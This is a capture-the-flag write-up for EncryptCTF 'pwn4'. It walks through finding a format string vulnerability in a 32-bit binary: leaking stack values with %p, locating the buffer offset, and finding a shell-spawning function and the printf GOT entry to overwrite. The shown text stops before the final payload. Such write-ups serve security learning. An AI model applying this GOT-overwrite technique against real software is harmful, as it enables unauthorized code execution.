## EncryptCTF: pwn4
##### *tl;dr: format string vulnerability*
#### I didn't solve this during the ctf since I had no knowledge regarding format string vulnerabilities and how to exploit them at that time. But with a little bit of reading, watching, and practice, I managed to solve it at last. For a better understanding of how the exploit works, watch LiveOverflow's [video](https://www.youtube.com/watch?v=t1LH9D5cuK4&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=21&t=221s). Checking the security of the binary, we get this:
```
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
#### Stack protection measures are on, guaranteeing that we won't be doing some stack-smashing on this challenge. And interesting to see the `No RELRO` protection, which means that we can overwrite stuff on the `Global Offset Table`. We do a quick format string test running the binary.
```
$ ./pwn4
Do you swear to use this shell with responsility by the old gods and the new?

AAAA %p %p %p %p %p %p %p %p %p %p %p %p
AAAA (nil) 0x2 (nil) 0xf7ffda9c 0x1 0xf7fcf410 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025
i don't belive you!
AAAA %p %p %p %p %p %p %p %p %p %p %p %p
```
#### And we can confirm that we have a format string vuln since we printed out values from the stack. We can also locate our buffer which is at the 7th offset. We can put our address at that offset and we can overwrite it to change control flow. But where do we want to redirect it to? Using gdb, we find a peculiarly labeled function `__` at address `0x0804853d`. Disassembling it we see the following code which grants us an interactive shell. 
```
gdb-peda$ disas __
Dump of assembler code for function __:
   0x0804853d <+0>:	push   ebp
   0x0804853e <+1>:	mov    ebp,esp
   0x08048540 <+3>:	sub    esp,0x18
   0x08048543 <+6>:	mov    DWORD PTR [esp],0x8048680
   0x0804854a <+13>:	call   0x8048400 <system@plt>
   0x0804854f <+18>:	leave  
   0x08048550 <+19>:	ret    
End of assembler dump.
```
#### Now that we have what we want to write, we figure out where do we want to write it to - the GOT entry of printf. If we successfully pull this off, when printf function is used, the flag function is called instead. We can easily get the addresses we need with gdb.
```
gdb-peda$ p printf
$1 = {<text variable, no debug info>} 0x80483c0 <printf@plt>

gdb-peda$ disas printf
Dump of assembler code for function printf@plt:
   0x080483c0 <+0>:	jmp    DWORD PTR ds:0x80498fc
   0x080483c6 <+6>:	push   0x0
   0x080483cb <+11>:	jmp    0x80483b0
End of assembler dump.
```
